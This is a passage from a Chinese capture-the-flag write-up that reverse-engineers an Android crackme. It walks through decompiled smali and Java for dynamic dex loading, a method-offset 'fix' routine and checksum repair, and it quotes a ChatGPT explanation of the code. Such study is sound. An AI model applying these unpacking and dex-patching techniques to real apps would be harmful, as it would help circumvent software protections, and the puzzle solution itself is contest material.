invoke-virtual      File-&gt;getAbsolutePath()String, v1<br />0000008C  move-result-object  v1<br />0000008E  const/4             v5, 0<br />00000090  invoke-direct       DexClassLoader-&gt;&lt;init&gt;(String, String, String, ClassLoader)V, v4, v3, v1, v5, v2<br />00000096  const-string        v1, <span style="color: rgb(168, 255, 96);">"com.zj.wuaipojie2024_2.C"</span><br />0000009A  invoke-virtual      DexClassLoader-&gt;loadClass(String)Class, v4, v1  <span style="color: rgb(124, 124, 124);"># 加载classes.dex里面的C Activity，和上面的C.smali对应</span><br />000000A0  move-result-object  v1<br />000000A2  const-string        v2, <span style="color: rgb(168, 255, 96);">"isValidate"</span><br />000000A6  const/4             v3, 3<br />000000A8  new-array           v4, v3, [Class<br />000000AC  const-class         v6, Context<br />000000B0  aput-object         v6, v4, v0<br />000000B4  const-class         v6, String<br />000000B8  const/4             v7, 1<br />000000BA  aput-object         v6, v4, v7<br />000000BE  const-class         v6, [I<br />000000C2  const/4             v8, 2<br />000000C4  aput-object         v6, v4, v8<br />000000C8  invoke-virtual      Class-&gt;getDeclaredMethod(String, [Class)Method, v1, v2, v4<br />000000CE  move-result-object  v1<br />000000D0  new-array           v2, v3, [Object<br />000000D4  aput-object         p0, v2, v0<br />000000D8  aput-object         p1, v2, v7<br />000000DC  invoke-virtual      MainActivity-&gt;getResources()Resources, p0  <span style="color: rgb(124, 124, 124);"># actual call site: Landroidx/appcompat/app/AppCompatActivity;-&gt;getResources()Landroid/content/res/Resources;</span><br />000000E2  move-result-object  p1<br />000000E4  sget                v3, R$array-&gt;A_offset:I<br />000000E8  invoke-virtual      Resources-&gt;getIntArray(I)[I, p1, v3  <span style="color: rgb(124, 124, 124);"># 传入Gesture构成的数字数组</span><br />000000EE  move-result-object  p1<br />000000F0  aput-object         p1, v2, v8<br />000000F4  invoke-virtual      Method-&gt;invoke(Object, [Object)Object, v1, v5, v2 <br />000000FA  move-result-object  p1<br />000000FC  check-cast          p1, String<br />00000100  if-eqz              p1,<span style="color: rgb(150, 203, 254);"> :12E</span>              <span style="color: rgb(124, 124, 124);"># 如果比较结果等于0，则跳转12E</span><span style="color: rgb(150, 203, 254);"><br />:104</span><br />00000104  const-string        v1, <span style="color: rgb(168, 255, 96);">"唉!"</span><br />00000108  invoke-virtual      String-&gt;startsWith(String)Z, p1, v1<br />0000010E  move-result         v1<br />00000110  if-eqz              v1,<span style="color: rgb(150, 203, 254);"> :12E</span><span style="color: rgb(150, 203, 254);"><br />:114</span><br />00000114  iget-object         v1, p0, MainActivity-&gt;tvText:TextView<br />00000118  invoke-virtual      TextView-&gt;setText(CharSequence)V, v1, p1<br />0000011E  iget-object         p1, p0, MainActivity-&gt;myunlock:GestureUnlock<br />00000122  const/16            v1, 8<br />00000126  invoke-virtual      GestureUnlock-&gt;setVisibility(I)V, p1, v1<br />          .catch Exception {:try_2 ..<span style="color: rgb(150, 203, 254);"> :tryend_12C</span>}<span style="color: rgb(150, 203, 254);"> :catch_130</span><span style="color: rgb(150, 203, 254);"><br />:tryend_12C</span><br />0000012C  return              v7<span style="color: rgb(150, 203, 254);"><br />:12E</span><br />0000012E  return              v0<span style="color: rgb(150, 203, 254);"><br />:catch_130</span>  <span style="color: rgb(124, 124, 124);"># used for: Ljava/lang/Exception;</span><br />00000130  move-exception      p1<br />00000132  invoke-virtual      Exception-&gt;printStackTrace()V, p1<br />00000138  return              v0<span style="color: rgb(150, 203, 254);"><br />.end method</span></code></pre><p>反编译为java就是：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">MainActivity</span> <span style="color: rgb(150, 203, 254);">extends</span> <span style="color: rgb(255, 255, 182);">AppCompatActivity</span> {<br />    <span style="color: rgb(150, 203, 254);">private</span> GestureUnlock myunlock;<br />    <span style="color: rgb(150, 203, 254);">private</span> TextView tvText;<br /><br />    <span style="color: rgb(150, 203, 254);">static</span> {<br />        System.loadLibrary(<span style="color: rgb(168, 255, 96);">"52pj"</span>);<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(255, 255, 182);">boolean</span> <span style="color: rgb(255, 255, 182);">checkPassword</span>(String s) {<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(255, 255, 182);">InputStream</span> <span style="color: rgb(198, 197, 254);">inputStream0</span> = this.getAssets().open(<span style="color: rgb(168, 255, 96);">"classes.dex"</span>);<br />            <span style="color: rgb(255, 255, 182);">byte</span>[] arr_b = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">byte</span>[inputStream0.available()];<br />            inputStream0.read(arr_b);<br />            <span style="color: rgb(255, 255, 182);">File</span> <span style="color: rgb(198, 197, 254);">file0</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">File</span>(this.getDir(<span style="color: rgb(168, 255, 96);">"data"</span>, <span style="color: rgb(255, 115, 253);">0</span>), <span style="color: rgb(168, 255, 96);">"1.dex"</span>);<br />            <span style="color: rgb(255, 255, 182);">FileOutputStream</span> <span style="color: rgb(198, 197, 254);">fileOutputStream0</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">FileOutputStream</span>(file0);<br />            fileOutputStream0.write(arr_b);<br />            fileOutputStream0.close();<br />            inputStream0.close();<br />            <span style="color: rgb(255, 255, 182);">File</span> <span style="color: rgb(198, 197, 254);">file1</span> = this.getDir(<span style="color: rgb(168, 255, 96);">"dex"</span>, <span style="color: rgb(255, 115, 253);">0</span>);<br />            <span style="color: rgb(255, 255, 182);">ClassLoader</span> <span style="color: rgb(198, 197, 254);">classLoader0</span> = this.getClass().getClassLoader();<br />            <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">s1</span> = (String)<span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">DexClassLoader</span>(file0.getAbsolutePath(), file1.getAbsolutePath(), <span style="color: rgb(198, 197, 254);">null</span>, classLoader0).loadClass(<span style="color: rgb(168, 255, 96);">"com.zj.wuaipojie2024_2.C"</span>).getDeclaredMethod(<span style="color: rgb(168, 255, 96);">"isValidate"</span>, Context.class, String.class, <span style="color: rgb(255, 255, 182);">int</span>[].class).invoke(<span style="color: rgb(198, 197, 254);">null</span>, this, s, this.getResources().getIntArray(array.A_offset));<br />            <span style="color: rgb(150, 203, 254);">if</span>(s1 != <span style="color: rgb(198, 197, 254);">null</span> &amp;&amp; (s1.startsWith(<span style="color: rgb(168, 255, 96);">"唉!"</span>))) {<br />                this.tvText.setText(s1);<br />                this.myunlock.setVisibility(<span style="color: rgb(255, 115, 253);">8</span>);<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">true</span>;<br />            }<br />        }<br />        <span style="color: rgb(150, 203, 254);">catch</span>(Exception exception0) {<br />            exception0.printStackTrace();<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">false</span>;<br />        }<br /><br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">false</span>;<br />    }<br /><br />    @ Override  <span style="color: rgb(124, 124, 124);">// androidx.fragment.app.FragmentActivity</span><br />    <span style="color: rgb(150, 203, 254);">protected</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">onCreate</span>(Bundle bundle0) {<br />        super.onCreate(bundle0);<br />        this.setContentView(layout.activity_main);<br />        <span style="color: rgb(255, 255, 182);">TextView</span> <span style="color: rgb(198, 197, 254);">textView0</span> = (TextView)this.findViewById(id.tv_text);<br />        this.tvText = textView0;<br />        textView0.setText(<span style="color: rgb(168, 255, 96);">"　　吾名玄天帝，昔为诸界之尊，因古诅咒，沉睡亿载。今幸苏醒，欲召百万神兵仙将，复掌万界，重铸天序。此举，需汝解封印，贡力之源。若助吾破诅归位，赐汝万界神尊，封一神域为土，永居众神之巅。"</span>);<br />        <span style="color: rgb(255, 255, 182);">GestureUnlock</span> <span style="color: rgb(198, 197, 254);">gestureUnlock0</span> = (GestureUnlock)this.findViewById(id.myunlock);<br />        this.myunlock = gestureUnlock0;<br />        gestureUnlock0.setIGestureListener(<span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">IGestureListener</span>() {<br />            @ Override  <span style="color: rgb(124, 124, 124);">// com.example.gesturelock.IGestureListener</span><br />            <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">isError</span>(String s) {<br />                Log.e(<span style="color: rgb(168, 255, 96);">"zj595"</span>, s);<br />                MainActivity.this.checkPassword(s);<br />            }<br /><br />            @ Override  <span style="color: rgb(124, 124, 124);">// com.example.gesturelock.IGestureListener</span><br />            <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">isSetUp</span>(String s) {<br />            }<br /><br />            @ Override  <span style="color: rgb(124, 124, 124);">// com.example.gesturelock.IGestureListener</span><br />            <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">isSuccessful</span>(String s) {<br />                Log.e(<span style="color: rgb(168, 255, 96);">"zj595"</span>, s);<br />            }<br />        });<br />    }<br />}</code></pre><p>程序逻辑还是比较明确的，复制一份classes.dex，命名为1.dex，动态加载dex文件中“com.zj.wuaipojie2024_2.C”类中的“isValidate”函数，传入图形密码字符串，读取返回字符串，如果返回字符串以“诶！”开头，则隐藏密码锁，展示该字符串。</p><p>接下来分析这个“isValidate”函数，同样转为java方便观看</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> String <span style="color: rgb(255, 255, 182);">isValidate</span>(Context context0, String s, <span style="color: rgb(255, 255, 182);">int</span>[] arr_v) <span style="color: rgb(150, 203, 254);">throws</span> Exception {<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(150, 203, 254);">return</span> (String)C.getStaticMethod(context0, arr_v, <span style="color: rgb(168, 255, 96);">"com.zj.wuaipojie2024_2.A"</span>, <span style="color: rgb(168, 255, 96);">"d"</span>, <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Class</span>[]{Context.class, String.class}).invoke(<span style="color: rgb(198, 197, 254);">null</span>, context0, s);<br />        }<br />        <span style="color: rgb(150, 203, 254);">catch</span>(Exception exception0) {<br />            Log.e(<span style="color: rgb(168, 255, 96);">"ZJ595"</span>, <span style="color: rgb(168, 255, 96);">"咦，似乎是坏掉的dex呢！"</span>);<br />            exception0.printStackTrace();<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(168, 255, 96);">""</span>;<br />        }<br />    }</code></pre><p>"isValidate"这个函数调用了同文件下的"getStaticMethod"函数</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">static</span> Method <span style="color: rgb(255, 255, 182);">getStaticMethod</span>(Context context0, <span style="color: rgb(255, 255, 182);">int</span>[] arr_v, String s, String s1, Class[] arr_class) <span style="color: rgb(150, 203, 254);">throws</span> Exception {<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(255, 255, 182);">File</span> <span style="color: rgb(198, 197, 254);">file0</span> = C.fix(C.read(context0), arr_v[<span style="color: rgb(255, 115, 253);">0</span>], arr_v[<span style="color: rgb(255, 115, 253);">1</span>], arr_v[<span style="color: rgb(255, 115, 253);">2</span>], context0);<br />            <span style="color: rgb(255, 255, 182);">ClassLoader</span> <span style="color: rgb(198, 197, 254);">classLoader0</span> = context0.getClass().getClassLoader();<br />            <span style="color: rgb(255, 255, 182);">File</span> <span style="color: rgb(198, 197, 254);">file1</span> = context0.getDir(<span style="color: rgb(168, 255, 96);">"fixed"</span>, <span style="color: rgb(255, 115, 253);">0</span>);<br />            <span style="color: rgb(255, 255, 182);">Method</span> <span style="color: rgb(198, 197, 254);">method0</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">DexClassLoader</span>(file0.getAbsolutePath(), file1.getAbsolutePath(), <span style="color: rgb(198, 197, 254);">null</span>, classLoader0).loadClass(s).getDeclaredMethod(s1, arr_class);<br />            file0.delete();<br />            <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">File</span>(file1, file0.getName()).delete();<br />            <span style="color: rgb(150, 203, 254);">return</span> method0;<br />        }<br />        <span style="color: rgb(150, 203, 254);">catch</span>(Exception exception0) {<br />            exception0.printStackTrace();<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">null</span>;<br />        }<br />    }</code></pre><p>"getStaticMethod""函数又调用了"fix"函数对dex文件进行修复，生成<code style="font-family: SFMono-Regular, Consolas, ;">2.dex</code>后加载修复后的<code style="font-family: SFMono-Regular, Consolas, ;">com.zj.wuaipojie2024_2.A</code>类中的<code style="font-family: SFMono-Regular, Consolas, ;">d</code>函数至method0，<span style="font-weight: 700;">然后删除生成的<code style="font-family: Consolas, Monaco, ;">2.dex</code>文件后返回（此处为重点）</span></p><p><span style="font-weight: 700;">注：修复前的A类是这样的</span></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">A</span> {<br />    <span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(150, 203, 254);">final</span> <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">SUCCESS_TAG</span> = <span style="color: rgb(168, 255, 96);">"唉!"</span>;<br /><br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(255, 255, 182);">boolean</span> <span style="color: rgb(255, 255, 182);">b</span>() {<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">false</span>;<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> String <span style="color: rgb(255, 255, 182);">c</span>(String s) {<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(168, 255, 96);">"?"</span> + s + <span style="color: rgb(168, 255, 96);">"?"</span>;<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> String <span style="color: rgb(255, 255, 182);">d</span>(Context context0, String s) {<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(168, 255, 96);">"?"</span> + s + <span style="color: rgb(168, 255, 96);">"?"</span>;<br />    }<br />}</code></pre><p>"fix"函数以及与之对应的"read"函数是这样的</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">    <span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">static</span> File <span style="color: rgb(255, 255, 182);">fix</span>(ByteBuffer byteBuffer0, <span style="color: rgb(255, 255, 182);">int</span> v, <span style="color: rgb(255, 255, 182);">int</span> v1, <span style="color: rgb(255, 255, 182);">int</span> v2, Context context0) <span style="color: rgb(150, 203, 254);">throws</span> Exception {<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(255, 255, 182);">File</span> <span style="color: rgb(198, 197, 254);">file0</span> = context0.getDir(<span style="color: rgb(168, 255, 96);">"data"</span>, <span style="color: rgb(255, 115, 253);">0</span>);<br />            <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">v3</span> = (<span style="color: rgb(255, 255, 182);">int</span>)(((Integer)D.getClassDefData(byteBuffer0, v).get(<span style="color: rgb(168, 255, 96);">"class_data_off"</span>)));<br />            <span style="color: rgb(255, 255, 182);">HashMap</span> <span style="color: rgb(198, 197, 254);">hashMap0</span> = D.getClassData(byteBuffer0, v3);<br />            ((<span style="color: rgb(255, 255, 182);">int</span>[][])hashMap0.get(<span style="color: rgb(168, 255, 96);">"direct_methods"</span>))[v1][<span style="color: rgb(255, 115, 253);">2</span>] = v2;<br />            <span style="color: rgb(255, 255, 182);">byte</span>[] arr_b = D.encodeClassData(hashMap0);<br />            byteBuffer0.position(v3);<br />            byteBuffer0.put(arr_b);<br />            byteBuffer0.position(<span style="color: rgb(255, 115, 253);">0x20</span>);<br />            <span style="color: rgb(255, 255, 182);">byte</span>[] arr_b1 = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">byte</span>[byteBuffer0.capacity() - <span style="color: rgb(255, 115, 253);">0x20</span>];<br />            byteBuffer0.get(arr_b1);<br />            <span style="color: rgb(255, 255, 182);">byte</span>[] arr_b2 = Utils.getSha1(arr_b1);<br />            byteBuffer0.position(<span style="color: rgb(255, 115, 253);">12</span>);<br />            byteBuffer0.put(arr_b2);<br />            <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">v4</span> = Utils.checksum(byteBuffer0);<br />            byteBuffer0.position(<span style="color: rgb(255, 115, 253);">8</span>);<br />            byteBuffer0.putInt(Integer.reverseBytes(v4));<br />            <span style="color: rgb(255, 255, 182);">byte</span>[] arr_b3 = byteBuffer0.array();<br />            <span style="color: rgb(255, 255, 182);">File</span> <span style="color: rgb(198, 197, 254);">file1</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">File</span>(file0, <span style="color: rgb(168, 255, 96);">"2.dex"</span>);<br />            <span style="color: rgb(255, 255, 182);">FileOutputStream</span> <span style="color: rgb(198, 197, 254);">fileOutputStream0</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">FileOutputStream</span>(file1);<br />            fileOutputStream0.write(arr_b3);<br />            fileOutputStream0.close();<br />            <span style="color: rgb(150, 203, 254);">return</span> file1;<br />        }<br />        <span style="color: rgb(150, 203, 254);">catch</span>(Exception exception0) {<br />            exception0.printStackTrace();<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">null</span>;<br />        }<br />    }<br />    <span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">static</span> ByteBuffer <span style="color: rgb(255, 255, 182);">read</span>(Context context0) {<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(255, 255, 182);">File</span> <span style="color: rgb(198, 197, 254);">file0</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">File</span>(context0.getDir(<span style="color: rgb(168, 255, 96);">"data"</span>, <span style="color: rgb(255, 115, 253);">0</span>), <span style="color: rgb(168, 255, 96);">"decode.dex"</span>);<br />            <span style="color: rgb(150, 203, 254);">if</span>(!file0.exists()) {<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">null</span>;<br />            }<br /><br />            <span style="color: rgb(255, 255, 182);">FileInputStream</span> <span style="color: rgb(198, 197, 254);">fileInputStream0</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">FileInputStream</span>(file0);<br />            <span style="color: rgb(255, 255, 182);">byte</span>[] arr_b = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">byte</span>[fileInputStream0.available()];<br />            fileInputStream0.read(arr_b);<br />            <span style="color: rgb(255, 255, 182);">ByteBuffer</span> <span style="color: rgb(198, 197, 254);">byteBuffer0</span> = ByteBuffer.wrap(arr_b);<br />            fileInputStream0.close();<br />            <span style="color: rgb(150, 203, 254);">return</span> byteBuffer0;<br />        }<br />        <span style="color: rgb(150, 203, 254);">catch</span>(Exception unused_ex) {<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">null</span>;<br />        }<br />    }</code></pre><p>看看chatgpt对以上代码的分析：</p><p>这段代码是一个Android应用中的一些Java代码，主要涉及到动态加载Dex文件的操作。下面我来逐个分析这几个函数的作用：</p><ol><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><code style="font-family: SFMono-Regular, Consolas, ;">fix(ByteBuffer byteBuffer0, int v, int v1, int v2, Context context0)</code></p></li><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">ByteBuffer byteBuffer0</code>：包含Dex文件内容的缓冲区。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">int v, int v1, int v2</code>：用于指定要修改的数据的位置和值。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">Context context0</code>：上下文对象，用于获取应用程序的目录等信息。</p></li></ul><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>这个函数的作用是修复一个ByteBuffer中的Dex文件，其中包括了修改Dex文件中的一些数据。</p></li><li style="margin-left: 2px;"><p>参数：</p></li><li style="margin-left: 2px;"><p>主要步骤：</p></li></ul><ol class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>解析Dex文件中的类数据和方法数据。</p></li><li style="margin-left: 2px;"><p>根据传入的参数修改方法数据中的某个值。</p></li><li style="margin-left: 2px;"><p>将修改后的数据写回ByteBuffer中。</p></li><li style="margin-left: 2px;"><p>计算并更新Dex文件的SHA1校验和和校验码。</p></li><li style="margin-left: 2px;"><p>将修改后的ByteBuffer写入到应用程序的私有目录中，并返回该文件。</p></li></ol><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><code style="font-family: SFMono-Regular, Consolas, ;">getStaticMethod(Context context0, int[] arr_v, String s, String s1, Class[] arr_class)</code></p></li><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">Context context0</code>：上下文对象。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">int[] arr_v</code>：一个整型数组，用于指定修复Dex文件时所需的参数。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">String s, String s1</code>：要调用的类名和方法名。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">Class[] arr_class</code>：方法参数的类型数组。</p></li></ul><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>这个函数的作用是获取一个静态方法。</p></li><li style="margin-left: 2px;"><p>参数：</p></li><li style="margin-left: 2px;"><p>主要步骤：</p></li></ul><ol class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>调用<code style="font-family: SFMono-Regular, Consolas, ;">fix()</code>函数修复Dex文件，并获取修复后的文件。</p></li><li style="margin-left: 2px;"><p>使用修复后的Dex文件创建一个DexClassLoader。</p></li><li style="margin-left: 2px;"><p>加载指定类名的类，并获取其中声明的静态方法。</p></li><li style="margin-left: 2px;"><p>删除修复后的文件和其在私有目录中的引用。</p></li><li style="margin-left: 2px;"><p>返回获取到的静态方法。</p></li></ol><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><code style="font-family: SFMono-Regular, Consolas, ;">isValidate(Context context0, String s, int[] arr_v)</code></p></li><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">Context context0</code>：上下文对象。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">String s</code>：要验证的字符串。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">int[] arr_v</code>：一个整型数组，用于指定修复Dex文件时所需的参数。</p></li></ul><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>这个函数的作用是验证某个字符串。</p></li><li style="margin-left: 2px;"><p>参数：</p></li><li style="margin-left: 2px;"><p>返回值：返回验证结果的字符串。</p></li><li style="margin-left: 2px;"><p>主要步骤：</p></li></ul><ol class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>调用<code style="font-family: SFMono-Regular, Consolas, ;">getStaticMethod()</code>函数获取指定类的静态方法。</p></li><li style="margin-left: 2px;"><p>调用获取到的静态方法来进行验证，并返回结果。</p></li></ol><li style="margin-left: 2px;"><p style="margin-bottom: 15px;"><code style="font-family: SFMono-Regular, Consolas, ;">read(Context context0)</code></p></li><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">Context context0</code>：上下文对象。</p></li></ul><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>这个函数的作用是读取Dex文件。</p></li><li style="margin-left: 2px;"><p>参数：</p></li><li style="margin-left: 2px;"><p>返回值：返回读取到的Dex文件的ByteBuffer。</p></li><li style="margin-left: 2px;"><p>主要步骤：</p></li></ul><ol class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>构造Dex文件的路径。</p></li><li style="margin-left: 2px;"><p>读取Dex文件内容到一个字节数组中。</p></li><li style="margin-left: 2px;"><p>将字节数组包装成ByteBuffer，并返回。</p></li></ol></ol><p>这些函数主要用于动态加载并修复Dex文件，然后执行其中的方法来实现某些功能。</p><h3>思路</h3><p>目前flag的关键在于两点，一个是图形锁代表的字符串s，一个是修复dex以后两个"?"的内容，</p><h3>动态分析&amp;dex修复*3</h3><h4>修复1</h4><p>静态分析结束，下面用010Editor打开classes.dex，图中可以明显看到dex的Adler32校验值和sha1校验值是错误的<br />也就是说附件里的classes.dex文件是损坏的</p><p><span style="font-weight: 700;">dex校验值损坏后，在反射加载类过程中会被系统拒绝，因此必须进行修复操作</span></p><p>读取logcat可见如下错误</p><blockquote><p style="margin-bottom: 15px;">E System : Unable to Load dex file: /data/user/0/com.zj.wuaipojie2024_2/app_data/1.dex</p><p style="margin-bottom: 15px;">E System : java.io.IOException: Failed to open dex files : from /data/user/0/com.zj.wuaipojie2024_2/app_data/1.dex because: Failure to verify dex file ' /data/user/0/com.zj.wuaipojie2024_2/app_data/1.dex': Bad Checksum (c607ea12, expected 22dcea4c)</p></blockquote><p>可见系统确实因校验值异常，拒绝加载了assets下复制的classes.dex</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=ff75dcf8&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKRdhyZV7Mpib8W5trDk38p9HcuysBicwLKPyZEBSswvcu1Ih2PI9wBkPw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>由于dex文件在010Editor中除了头部外并无明显异常情况，因此我们使用DexRepair对dex头部进行修复：<code style="font-family: SFMono-Regular, Consolas, ;">java -jar DexRepair.jar /path/to/dex</code></p><p>修复后头部变为全绿：<br /><img border="0" 